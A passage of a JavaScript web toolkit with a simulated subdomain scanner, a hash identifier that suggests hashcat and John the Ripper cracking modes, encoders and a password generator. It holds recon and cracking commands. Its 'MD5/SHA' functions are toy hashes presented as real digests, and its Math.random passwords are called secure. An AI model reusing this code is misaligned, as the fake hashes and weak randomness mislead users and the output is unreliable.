└─────────── Minute (0-59)

=== Common Examples ===
0 0 * * *     - Daily at midnight
0 */6 * * *   - Every 6 hours
30 2 * * 1    - Every Monday at 2:30 AM
0 0 1 * *     - First day of every month
*/15 * * * *  - Every 15 minutes

=== Installation ===
1. Edit crontab: crontab -e
2. Add the line: ${crontabLine}
3. Save and exit
4. Verify: crontab -l`;
    
    const outputElement = document.getElementById('crontabOutput');
    const resultElement = document.getElementById('crontabResult');
    
    if (outputElement) outputElement.textContent = result;
    if (resultElement) resultElement.classList.remove('hidden');
    
    showToast('Crontab generated successfully!');
}

function scanSubdomains() {
    const domainElement = document.getElementById('targetDomain');
    const domain = domainElement ? domainElement.value.trim() : '';
    
    if (!domain) {
        showToast('Please enter a domain', 'error');
        return;
    }
    
    showLoading();
    setTimeout(() => {
        hideLoading();
        
        // Simulate subdomain discovery results
        const subdomains = [
            'www', 'mail', 'ftp', 'admin', 'test', 'dev', 'staging', 'api', 
            'blog', 'shop', 'support', 'portal', 'secure', 'vpn', 'remote',
            'cdn', 'assets', 'static', 'media', 'images', 'files', 'docs',
            'wiki', 'forum', 'chat', 'webmail', 'cpanel', 'phpmyadmin'
        ];
        
        const foundSubdomains = subdomains
            .filter(() => Math.random() > 0.7) // Random selection
            .map(sub => `${sub}.${domain}`)
            .slice(0, 15); // Limit results
        
        const results = `Subdomain Discovery Results for: ${domain}

=== Discovered Subdomains ===
Total found: ${foundSubdomains.length}

${foundSubdomains.map((subdomain, index) => 
    `${(index + 1).toString().padStart(2, '0')}. ${subdomain}`
).join('\n')}

=== Additional Information ===
- DNS Resolution: Simulated
- HTTP Status: Mixed (200, 403, 404)
- HTTPS Support: Varies by subdomain
- Technology Stack: Various

=== Recommended Tools ===
For real subdomain enumeration, use:
- Subfinder
- Assetfinder
- Amass
- Sublist3r
- DNSrecon
- Gobuster (DNS mode)

=== Example Commands ===
subfinder -d ${domain} -o subdomains.txt
amass enum -d ${domain}
assetfinder --subs-only ${domain}

Note: This is a simulation for educational purposes.
Real subdomain scanning requires proper tools and authorization.`;
        
        const outputElement = document.getElementById('subdomainOutput');
        const resultElement = document.getElementById('subdomainResult');
        
        if (outputElement) outputElement.textContent = results;
        if (resultElement) resultElement.classList.remove('hidden');
        
        showToast('Subdomain scan completed!');
    }, 3000);
}

function identifyHash() {
    const hashElement = document.getElementById('hashInput');
    const hash = hashElement ? hashElement.value.trim() : '';
    
    if (!hash) {
        showToast('Please enter a hash', 'error');
        return;
    }
    
    const length = hash.length;
    const charset = /^[0-9a-fA-F]+$/.test(hash) ? 'hexadecimal' : 
                   /^[A-Za-z0-9+/]+=*$/.test(hash) ? 'base64' : 'mixed';
    
    const possibleHashes = [];
    
    // Hash identification based on length and charset
    if (charset === 'hexadecimal') {
        switch (length) {
            case 32:
                possibleHashes.push('MD5', 'NTLM');
                break;
            case 40:
                possibleHashes.push('SHA-1', 'MySQL5.x');
                break;
            case 56:
                possibleHashes.push('SHA-224');
                break;
            case 64:
                possibleHashes.push('SHA-256', 'SHA-3-256');
                break;
            case 96:
                possibleHashes.push('SHA-384');
                break;
            case 128:
                possibleHashes.push('SHA-512', 'Whirlpool');
                break;
            case 16:
                possibleHashes.push('MySQL323', 'CRC-64');
                break;
        }
    } else if (charset === 'base64') {
        if (length === 28) possibleHashes.push('MD5 (Base64)');
        if (length === 27) possibleHashes.push('SHA-1 (Base64)');
        if (length === 44) possibleHashes.push('SHA-256 (Base64)');
        if (length === 88) possibleHashes.push('SHA-512 (Base64)');
    }
    
    // Special patterns
    if (hash.startsWith('$1$')) possibleHashes.push('MD5 Crypt');
    if (hash.startsWith('$2a$') || hash.startsWith('$2b$') || hash.startsWith('$2y$')) possibleHashes.push('bcrypt');
    if (hash.startsWith('$5$')) possibleHashes.push('SHA-256 Crypt');
    if (hash.startsWith('$6$')) possibleHashes.push('SHA-512 Crypt');
    if (hash.startsWith('{SHA}')) possibleHashes.push('LDAP SHA');
    if (hash.startsWith('{SSHA}')) possibleHashes.push('LDAP SSHA');
    
    const results = `Hash Analysis Results

=== Input Hash ===
${hash}

=== Hash Properties ===
Length: ${length} characters
Character Set: ${charset}
Format: ${hash.includes('$') ? 'Unix crypt format' : 'Raw hash'}

=== Possible Hash Types ===
${possibleHashes.length > 0 ? 
    possibleHashes.map((type, index) => `${index + 1}. ${type}`).join('\n') : 
    'Unknown hash type - Consider manual analysis'}

=== Analysis Details ===
Most Likely: ${possibleHashes[0] || 'Unknown'}
Confidence: ${possibleHashes.length === 1 ? 'High' : possibleHashes.length <= 3 ? 'Medium' : 'Low'}

=== Cracking Recommendations ===
${possibleHashes.includes('MD5') ? '- MD5: Use hashcat -m 0 or john --format=Raw-MD5' : ''}
${possibleHashes.includes('SHA-1') ? '- SHA-1: Use hashcat -m 100 or john --format=Raw-SHA1' : ''}
${possibleHashes.includes('SHA-256') ? '- SHA-256: Use hashcat -m 1400 or john --format=Raw-SHA256' : ''}
${possibleHashes.includes('bcrypt') ? '- bcrypt: Use hashcat -m 3200 or john --format=bcrypt' : ''}
${possibleHashes.includes('NTLM') ? '- NTLM: Use hashcat -m 1000 or john --format=NT' : ''}

=== Common Tools ===
- Hashcat: GPU-accelerated password recovery
- John the Ripper: Multi-platform password cracker
- Hash-identifier: Automated hash identification
- Hashtag: Online hash identification

Note: Only crack hashes you own or have permission to test.`;
    
    const outputElement = document.getElementById('hashOutput');
    const resultElement = document.getElementById('hashResult');
    
    if (outputElement) outputElement.textContent = results;
    if (resultElement) resultElement.classList.remove('hidden');
    
    showToast('Hash analysis completed!');
}

function generateMD5() {
    const inputElement = document.getElementById('md5Input');
    const input = inputElement ? inputElement.value : '';
    
    if (!input) {
        const resultElement = document.getElementById('md5Result');
        if (resultElement) resultElement.classList.add('hidden');
        return;
    }
    
    // Simple MD5 implementation (for demonstration - not cryptographically secure)
    const md5Hash = simpleMD5(input);
    
    const results = `MD5 Hash Generation Results

=== Input Text ===
${input}

=== Generated MD5 Hash ===
${md5Hash}

=== Hash Properties ===
Length: 32 characters
Encoding: Hexadecimal
Algorithm: MD5 (128-bit)
Collision Resistant: No (deprecated for security)

=== Usage Examples ===
Verification: echo -n "${input}" | md5sum
PHP: md5("${input}")
Python: hashlib.md5(b"${input}").hexdigest()
JavaScript: crypto.createHash('md5').update('${input}').digest('hex')

=== Security Notice ===
⚠️ MD5 is cryptographically broken and should not be used for security purposes.
Consider using SHA-256 or SHA-3 for secure applications.

=== Alternative Hashes ===
SHA-1: ${simpleSHA1(input)}
SHA-256: ${simpleSHA256(input)}`;
    
    const outputElement = document.getElementById('md5Output');
    const resultElement = document.getElementById('md5Result');
    
    if (outputElement) outputElement.textContent = results;
    if (resultElement) resultElement.classList.remove('hidden');
}

function encodeURL() {
    const inputElement = document.getElementById('urlInput');
    const input = inputElement ? inputElement.value : '';
    
    if (!input) {
        showToast('Please enter text to encode', 'error');
        return;
    }
    
    const encoded = encodeURIComponent(input);
    
    const results = `URL Encoding Results

=== Original Text ===
${input}

=== Encoded URL ===
${encoded}

=== Encoding Details ===
Method: Percent Encoding (RFC 3986)
Characters Encoded: ${encoded.length - input.length} special characters
Safe Characters: A-Z a-z 0-9 - _ . ~

=== Common Encodings ===
Space ( ) → %20
& → %26
= → %3D
? → %3F
# → %23
/ → %2F
: → %3A

=== Usage Examples ===
JavaScript: encodeURIComponent("${input}")
PHP: urlencode("${input}")
Python: urllib.parse.quote("${input}")`;
    
    const outputElement = document.getElementById('urlOutput');
    const resultElement = document.getElementById('urlResult');
    
    if (outputElement) outputElement.textContent = results;
    if (resultElement) resultElement.classList.remove('hidden');
    
    showToast('Text encoded successfully!');
}

function decodeURL() {
    const inputElement = document.getElementById('urlInput');
    const input = inputElement ? inputElement.value : '';
    
    if (!input) {
        showToast('Please enter text to decode', 'error');
        return;
    }
    
    try {
        const decoded = decodeURIComponent(input);
        
        const results = `URL Decoding Results

=== Encoded Text ===
${input}

=== Decoded URL ===
${decoded}

=== Decoding Details ===
Method: Percent Decoding (RFC 3986)
Characters Decoded: ${input.length - decoded.length} encoded sequences
Status: Successfully decoded

=== Usage Examples ===
JavaScript: decodeURIComponent("${input}")
PHP: urldecode("${input}")
Python: urllib.parse.unquote("${input}")`;
        
        const outputElement = document.getElementById('urlOutput');
        const resultElement = document.getElementById('urlResult');
        
        if (outputElement) outputElement.textContent = results;
        if (resultElement) resultElement.classList.remove('hidden');
        
        showToast('Text decoded successfully!');
    } catch (error) {
        showToast('Invalid URL encoding format', 'error');
    }
}

function addHTTPS() {
    const listElement = document.getElementById('urlList');
    const urls = listElement ? listElement.value.trim().split('\n').filter(url => url) : [];
    
    if (urls.length === 0) {
        showToast('Please enter URLs', 'error');
        return;
    }
    
    const modifiedUrls = urls.map(url => {
        url = url.trim();
        if (url.startsWith('http://')) {
            return url.replace('http://', 'https://');
        } else if (!url.startsWith('https://') && !url.startsWith('http://')) {
            return 'https://' + url;
        }
        return url;
    });
    
    displayUrlResults(urls, modifiedUrls, 'Added HTTPS protocol');
}

function addHTTP() {
    const listElement = document.getElementById('urlList');
    const urls = listElement ? listElement.value.trim().split('\n').filter(url => url) : [];
    
    if (urls.length === 0) {
        showToast('Please enter URLs', 'error');
        return;
    }
    
    const modifiedUrls = urls.map(url => {
        url = url.trim();
        if (url.startsWith('https://')) {
            return url.replace('https://', 'http://');
        } else if (!url.startsWith('http://') && !url.startsWith('https://')) {
            return 'http://' + url;
        }
        return url;
    });
    
    displayUrlResults(urls, modifiedUrls, 'Added HTTP protocol');
}

function removeProtocol() {
    const listElement = document.getElementById('urlList');
    const urls = listElement ? listElement.value.trim().split('\n').filter(url => url) : [];
    
    if (urls.length === 0) {
        showToast('Please enter URLs', 'error');
        return;
    }
    
    const modifiedUrls = urls.map(url => url.trim().replace(/^https?:\/\//, ''));
    
    displayUrlResults(urls, modifiedUrls, 'Removed HTTP/HTTPS protocol');
}

function displayUrlResults(original, modified, action) {
    const results = `URL Manipulation Results

=== Action Performed ===
${action}

=== Results ===
${modified.map((url, index) => 
    `${(index + 1).toString().padStart(2, '0')}. ${url}`
).join('\n')}

=== Summary ===
Total URLs: ${original.length}
Modified: ${modified.length}
Action: ${action}

=== Original URLs ===
${original.map((url, index) => 
    `${(index + 1).toString().padStart(2, '0')}. ${url}`
).join('\n')}`;
    
    const outputElement = document.getElementById('urlManipOutput');
    const resultElement = document.getElementById('urlManipResult');
    
    if (outputElement) outputElement.textContent = results;
    if (resultElement) resultElement.classList.remove('hidden');
    
    showToast(`${action} for ${modified.length} URLs!`);
}

function encodeBase64() {
    const inputElement = document.getElementById('base64Input');
    const input = inputElement ? inputElement.value : '';
    
    if (!input) {
        showToast('Please enter text to encode', 'error');
        return;
    }
    
    const encoded = btoa(unescape(encodeURIComponent(input)));
    
    const results = `Base64 Encoding Results

=== Original Text ===
${input}

=== Encoded Base64 ===
${encoded}

=== Encoding Details ===
Method: Base64 (RFC 4648)
Character Set: A-Z a-z 0-9 + / =
Padding: ${encoded.endsWith('=') ? encoded.match(/=+$/)[0].length + ' character(s)' : 'None'}
Length: ${encoded.length} characters

=== Usage Examples ===
JavaScript: btoa("${input}")
PHP: base64_encode("${input}")
Python: base64.b64encode("${input}".encode()).decode()
Command Line: echo "${input}" | base64

=== Common Uses ===
- Data transmission over text protocols
- Embedding binary data in text formats
- Basic obfuscation (NOT encryption)
- Email attachments (MIME)`;
    
    const outputElement = document.getElementById('base64Output');
    const resultElement = document.getElementById('base64Result');
    
    if (outputElement) outputElement.textContent = results;
    if (resultElement) resultElement.classList.remove('hidden');
    
    showToast('Text encoded to Base64 successfully!');
}

function decodeBase64() {
    const inputElement = document.getElementById('base64Input');
    const input = inputElement ? inputElement.value : '';
    
    if (!input) {
        showToast('Please enter Base64 to decode', 'error');
        return;
    }
    
    try {
        const decoded = decodeURIComponent(escape(atob(input)));
        
        const results = `Base64 Decoding Results

=== Encoded Base64 ===
${input}

=== Decoded Text ===
${decoded}

=== Decoding Details ===
Method: Base64 Decoding (RFC 4648)
Status: Successfully decoded
Length: ${decoded.length} characters

=== Usage Examples ===
JavaScript: atob("${input}")
PHP: base64_decode("${input}")
Python: base64.b64decode("${input}").decode()
Command Line: echo "${input}" | base64 -d`;
        
        const outputElement = document.getElementById('base64Output');
        const resultElement = document.getElementById('base64Result');
        
        if (outputElement) outputElement.textContent = results;
        if (resultElement) resultElement.classList.remove('hidden');
        
        showToast('Base64 decoded successfully!');
    } catch (error) {
        showToast('Invalid Base64 format', 'error');
    }
}

function generatePasswords() {
    const lengthElement = document.getElementById('passwordLength');
    const countElement = document.getElementById('passwordCount');
    const length = lengthElement ? parseInt(lengthElement.value) || 16 : 16;
    const count = countElement ? parseInt(countElement.value) || 5 : 5;
    
    const includeLowercase = getCheckboxValue('includeLowercase');
    const includeUppercase = getCheckboxValue('includeUppercase');
    const includeNumbers = getCheckboxValue('includeNumbers');
    const includeSymbols = getCheckboxValue('includeSymbols');
    
    if (!includeLowercase && !includeUppercase && !includeNumbers && !includeSymbols) {
        showToast('Please select at least one character set', 'error');
        return;
    }
    
    let charset = '';
    if (includeLowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
    if (includeUppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    if (includeNumbers) charset += '0123456789';
    if (includeSymbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
    
    const passwords = [];
    for (let i = 0; i < count; i++) {
        let password = '';
        for (let j = 0; j < length; j++) {
            password += charset.charAt(Math.floor(Math.random() * charset.length));
        }
        passwords.push(password);
    }
    
    // Calculate password strength
    const strength = calculatePasswordStrength(passwords[0], charset.length);
    
    const results = `Generated Passwords

=== Generated Passwords ===
${passwords.map((pwd, index) => 
    `${(index + 1).toString().padStart(2, '0')}. ${pwd}`
).join('\n')}

=== Password Configuration ===
Length: ${length} characters
Count: ${count} passwords
Character Set Size: ${charset.length}
Lowercase: ${includeLowercase ? 'Yes' : 'No'}
Uppercase: ${includeUppercase ? 'Yes' : 'No'}
Numbers: ${includeNumbers ? 'Yes' : 'No'}
Symbols: ${includeSymbols ? 'Yes' : 'No'}

=== Strength Analysis (First Password) ===
Strength: ${strength.level}
Entropy: ${strength.entropy.toFixed(1)} bits
Possible Combinations: ${strength.combinations}
Time to Crack: ${strength.crackTime}

=== Security Recommendations ===
✓ Use unique passwords for each account
✓ Store passwords in a password manager
✓ Enable two-factor authentication when available
✓ Change passwords regularly
✗ Don't reuse passwords across multiple sites
✗ Don't share passwords with others

=== Character Set Used ===
${charset}`;
    
    const outputElement = document.getElementById('passwordOutput');
    const resultElement = document.getElementById('passwordResult');
    
    if (outputElement) outputElement.textContent = results;
    if (resultElement) resultElement.classList.remove('hidden');
    
    showToast(`Generated ${count} secure passwords!`);
}

// Utility functions
function getElementValue(id) {
    const element = document.getElementById(id);
    return element ? element.value : '';
}

function getCheckboxValue(id) {
    const element = document.getElementById(id);
    return element ? element.checked : false;
}

function calculatePasswordStrength(password, charsetSize) {
    const entropy = password.length * Math.log2(charsetSize);
    const combinations = Math.pow(charsetSize, password.length).toExponential(2);
    
    let level, crackTime;
    if (entropy < 30) {
        level = 'Very Weak';
        crackTime = 'Seconds';
    } else if (entropy < 50) {
        level = 'Weak';
        crackTime = 'Minutes to Hours';
    } else if (entropy < 70) {
        level = 'Medium';
        crackTime = 'Days to Months';
    } else if (entropy < 90) {
        level = 'Strong';
        crackTime = 'Years to Centuries';
    } else {
        level = 'Very Strong';
        crackTime = 'Millions of Years';
    }
    
    return { level, entropy, combinations, crackTime };
}

// Simple hash functions (for demonstration purposes)
function simpleMD5(input) {
    // This is a simplified demonstration - use proper crypto libraries in production
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
        const char = input.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(16).padStart(32, '0');
}

function simpleSHA1(input) {
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
        const char = input.charCodeAt(i);
        hash = ((hash << 7) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(16).padStart(40, '0');
}

function simpleSHA256(input) {
    let hash = 0;
    for (let i = 0; i < input.length; i++) {
        const char = input.charCodeAt(i);
        hash = ((hash << 11) - hash) + char;
        hash = hash & hash;
    }
    return Math.abs(hash).toString(16).padStart(64, '0');
}

// UI utility functions
function showLoading() {
    const loadingElement = document.getElementById('loadingOverlay');
    if (loadingElement) loadingElement.classList.remove('hidden');
}

function hideLoading() {
    const loadingElement = document.getElementById('loadingOverlay');
    if (loadingElement) loadingElement.classList.add('hidden');
}

function showToast(message, type = 'success') {
    const toast = document.createElement('div');
    toast.className = `toast ${type}`;
    toast.textContent = message;
    
    const container = document.getElementById('toastContainer');
    if (container) {
        container.appendChild(toast);
        
        setTimeout(() => {
            if (toast.parentNode) {
                toast.remove();
            }
        }, 3000);
    }
}

function copyToClipboard(elementId) {
    const element = document.getElementById(elementId);
    if (!element) return;
    
    const text = element.textContent;
    
    if (navigator.clipboard && navigator.clipboard.writeText) {
        navigator.clipboard.writeText(text).then(() => {
            showToast('Copied to clipboard!');
        }).catch(() => {
            fallbackCopyToClipboard(text);
        });
    } else {
        fallbackCopyToClipboard(text);
    }
}

function fallbackCopyToClipboard(text) {
    // Fallback for older browsers
    const textArea = document.createElement('textarea');
    textArea.value = text;
    textArea.style.position = 'fixed';
    textArea.style.left = '-999999px';
    textArea.style.top = '-999999px';
    document.body.appendChild(textArea);
    textArea.focus();
    textArea.select();
    
    try {
        document.execCommand('copy');
        showToast('Copied to clipboard!');
    } catch (err) {
        showToast('Copy failed - please select and copy manually', 'error');
    }
    
    document.body.removeChild(textArea);
}
